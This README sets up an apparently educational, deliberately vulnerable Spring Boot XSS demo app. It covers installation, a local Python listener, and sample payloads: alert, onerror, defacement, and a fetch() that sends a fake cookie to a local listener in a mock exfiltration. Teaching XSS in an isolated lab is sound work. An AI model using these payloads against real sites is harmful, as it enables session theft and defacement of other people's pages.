# vuln-xss-app — Vulnerable XSS Demo (Java / Spring Boot)

**Project:** `vuln-xss-app`
**Purpose:** Local, controlled demonstration of reflected, stored, and DOM XSS for educational use only.

> **Warning:** Do **not** use these payloads or servers against other machines or on the Internet. Run all demos only on localhost or in an isolated VM.

---

## Contents

- `pom.xml` — Maven project file
- `src/main/java/com/example/vulnxss/` — Spring Boot sources
- `src/main/resources/static/` — static frontend (search.html, comments.html, etc.)
- `attacker_listener.py` — optional local listener for safe exfiltration demo (lab-only)

---

## Quickstart (high-level)

- **Windows (PowerShell, admin):** install JDK 17 & Maven → `mvn spring-boot:run` → open `http://localhost:8080`
- **Ubuntu (bash):** `sudo apt install openjdk-17-jdk maven` → `mvn spring-boot:run` → open `http://localhost:8080`
- Optionally run `attacker_listener.py` (Python) to capture safe local exfil demonstration.

---

## 1. Prerequisites

### Windows (PowerShell)

- Administrator access recommended for installs.
- Install Chocolatey (if not installed): https://chocolatey.org/install
- Install Java 17 and Maven via Chocolatey (PowerShell as Admin):

```powershell
choco install openjdk17 -y
choco install maven -y
```

- Close & reopen PowerShell. Verify:

```powershell
java -version
mvn -v
```

### Ubuntu (bash)

```bash
sudo apt update
sudo apt install -y openjdk-17-jdk maven python3 python3-pip
java -version
mvn -v
```

---

## 2. Prepare the project

Open a terminal in the project root (where `pom.xml` lives). If you copied/cloned the repository, point your shell to that directory.

---

## 3. Run the Spring Boot app (Maven)

**Default port:** 8080 (if busy, see alternate port below)

### Windows (PowerShell)

```powershell
cd D:\262\A3\vuln-xss-app
mvn spring-boot:run
# OR run on a different port:
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

### Ubuntu (bash)

```bash
cd ~/vuln-xss-app
mvn spring-boot:run
# OR different port:
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

**Open in browser:** `http://localhost:8080` (or `:3001` if you changed it)

---

## 4. Single-file Java server (no Maven alternative)

A lightweight single-file Java server is included (`VulnXssServer.java`) if you prefer not to use Maven.

### Compile & run (Windows / Ubuntu)

```bash
javac VulnXssServer.java
java VulnXssServer
# server listens on http://localhost:3000
```

---

## 5. Optional: Local Python listener (safe exfil demo)

This listener runs on your machine / VM and logs any HTTP POSTs that arrive. Use it only in your lab environment.

Create `attacker_listener.py` with the following content:

```python
# attacker_listener.py (lab-only)
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        print("=== Request received ===")
        print("Path:", self.path)
        print("Headers:", self.headers)
        print("Body:", body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 9000), Handler)
    print("Listening on http://0.0.0.0:9000")
    server.serve_forever()
```

### Run listener

**Windows:**

```powershell
python attacker_listener.py
```

**Ubuntu:**

```bash
python3 attacker_listener.py
```

**Test payload (from vulnerable page)** — posts to your listener (local only):

```html
<img
  src="x"
  onerror="fetch('http://localhost:9000/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:'demo-data-from-xss'})"
/>
```

When you trigger such a payload in the vulnerable app (search q or comment), the listener terminal prints the received request.

---

## 6. Quick test payloads (use in query `q=` or comments form)

- Simple alert (may be blocked by modern browsers/extensions):

```
<script>alert('reflected')</script>
```

- More robust onerror payload (expected 404 but then runs):

```html
<img
  src="x"
  onerror="console.log('XSS fired'); document.body.style.border='6px solid red'"
/>
```

- Visual defacement (safe):

```html
<script>
  document.body.innerHTML = '<h1 style="color:red">Hacked — demo</h1>';
</script>
```

- Local exfil (lab-only: posts to your listener):

```html
<img
  src="x"
  onerror="fetch('http://localhost:9000/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:'demo-cookie=FAKE'})"
/>
```

---

## 7. Troubleshooting

### Port already in use

If Spring Boot fails because the port is used:

- Find process (PowerShell): `netstat -ano | Select-String ":8080\s"`
- Kill process by PID (if safe): `Stop-Process -Id <PID> -Force`
- Or run on a different port:

```powershell
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

### `mvn` or `java` not found

- Windows: ensure Chocolatey installed JDK and Maven and restart terminal. Verify `java -version` and `mvn -v`.
- Ubuntu: `sudo apt install openjdk-17-jdk maven`.

### Browser blocking alerts

- Use `console.log` + a visible DOM change (banner or border) for reliable evidence.
- Try Incognito to avoid extension interference.

---

## 8. Reverting demo-only changes

If you temporarily added demo-only code that executes payloads (e.g., creating `<script>` tags from user input), **remove it before submission**. Example revert for `search.html`:

```html
const params = new URLSearchParams(location.search); const q = params.get('q')
|| ''; document.getElementById('resultContainer').textContent = q; // safe
display
```
